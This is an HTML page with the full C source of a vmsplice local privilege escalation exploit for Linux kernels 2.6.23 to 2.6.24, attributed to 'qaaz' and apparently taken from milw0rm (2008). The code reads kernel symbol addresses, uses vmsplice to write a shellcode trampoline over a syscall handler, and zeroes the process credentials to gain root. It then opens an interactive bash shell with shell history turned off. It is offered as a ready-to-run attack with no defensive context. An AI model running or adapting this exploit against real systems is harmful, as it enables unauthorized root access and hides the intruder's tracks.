<html><head><title>Linux Kernel 2.6.23 - 2.6.24 vmsplice Local Root Exploit</title></head><pre>/*
 * diane_lane_fucked_hard.c
 *
 * Linux vmsplice Local Root Exploit
 * By qaaz
 *
 * Linux 2.6.23 - 2.6.24
 */
#define _GNU_SOURCE
#include &lt;stdio.h&gt;
#include &lt;errno.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/uio.h&gt;

#define TARGET_PATTERN		&quot; sys_vm86old&quot;
#define TARGET_SYSCALL		113

#ifndef __NR_vmsplice
#define __NR_vmsplice		316
#endif

#define _vmsplice(fd,io,nr,fl)	syscall(__NR_vmsplice, (fd), (io), (nr), (fl))
#define gimmeroot()		syscall(TARGET_SYSCALL, 31337, kernel_code, 1, 2, 3, 4)

#define TRAMP_CODE		(void *) trampoline	
#define TRAMP_SIZE		( sizeof(trampoline) - 1 )

unsigned char trampoline[] =
&quot;\x8b\x5c\x24\x04&quot;		/* mov    0x4(%esp),%ebx	*/
&quot;\x8b\x4c\x24\x08&quot;		/* mov    0x8(%esp),%ecx	*/
&quot;\x81\xfb\x69\x7a\x00\x00&quot;	/* cmp    $31337,%ebx		*/
&quot;\x75\x02&quot;			/* jne    +2			*/
&quot;\xff\xd1&quot;			/* call   *%ecx			*/
&quot;\xb8\xea\xff\xff\xff&quot;		/* mov    $-EINVAL,%eax		*/
&quot;\xc3&quot;				/* ret				*/
;

void	die(char *msg, int err)
{
	printf(err ? &quot;[-] %s: %s\n&quot; : &quot;[-] %s\n&quot;, msg, strerror(err));
	fflush(stdout);
	fflush(stderr);
	exit(1);
}

long	get_target()
{
	FILE	*f;
	long	addr = 0;
	char	line[128];

	f = fopen(&quot;/proc/kallsyms&quot;, &quot;r&quot;);
	if (!f) die(&quot;/proc/kallsyms&quot;, errno);

	while (fgets(line, sizeof(line), f)) {
		if (strstr(line, TARGET_PATTERN)) {
			addr = strtoul(line, NULL, 16);
			break;
		}
	}

	fclose(f);
	return addr;
}

static inline __attribute__((always_inline))
void *	get_current()
{
	unsigned long curr;
	__asm__ __volatile__ (
	&quot;movl %%esp, %%eax ;&quot;
	&quot;andl %1, %%eax ;&quot;
	&quot;movl (%%eax), %0&quot;
	: &quot;=r&quot; (curr)
	: &quot;i&quot; (~8191)
	);
	return (void *) curr;
}

static uint uid, gid;

void	kernel_code()
{
	int	i;
	uint	*p = get_current();

	for (i = 0; i &lt; 1024-13; i++) {
		if (p[0] == uid &amp;&amp; p[1] == uid &amp;&amp;
		    p[2] == uid &amp;&amp; p[3] == uid &amp;&amp;
		    p[4] == gid &amp;&amp; p[5] == gid &amp;&amp;
		    p[6] == gid &amp;&amp; p[7] == gid) {
			p[0] = p[1] = p[2] = p[3] = 0;
			p[4] = p[5] = p[6] = p[7] = 0;
			p = (uint *) ((char *)(p + 8) + sizeof(void *));
			p[0] = p[1] = p[2] = ~0;
			break;
		}
		p++;
	}	
}

int	main(int argc, char *argv[])
{
	int		pi[2];
	long		addr;
	struct iovec	iov;

	uid = getuid();
	gid = getgid();
	setresuid(uid, uid, uid);
	setresgid(gid, gid, gid);

	printf(&quot;-----------------------------------\n&quot;);
	printf(&quot; Linux vmsplice Local Root Exploit\n&quot;);
	printf(&quot; By qaaz\n&quot;);
	printf(&quot;-----------------------------------\n&quot;);

	if (!uid || !gid)
		die(&quot;!@#$&quot;, 0);

	addr = get_target();
	printf(&quot;[+] addr: 0x%lx\n&quot;, addr);

	if (pipe(pi) &lt; 0)
		die(&quot;pipe&quot;, errno);

	iov.iov_base = (void *) addr;
	iov.iov_len  = TRAMP_SIZE;

	write(pi[1], TRAMP_CODE, TRAMP_SIZE);
	_vmsplice(pi[0], &amp;iov, 1, 0);

	gimmeroot();

	if (getuid() != 0)
		die(&quot;wtf&quot;, 0);

	printf(&quot;[+] root\n&quot;);
	putenv(&quot;HISTFILE=/dev/null&quot;);
	execl(&quot;/bin/bash&quot;, &quot;bash&quot;, &quot;-i&quot;, NULL);
	die(&quot;/bin/bash&quot;, errno);
	return 0;
}

// milw0rm.com [2008-02-09]</pre></html>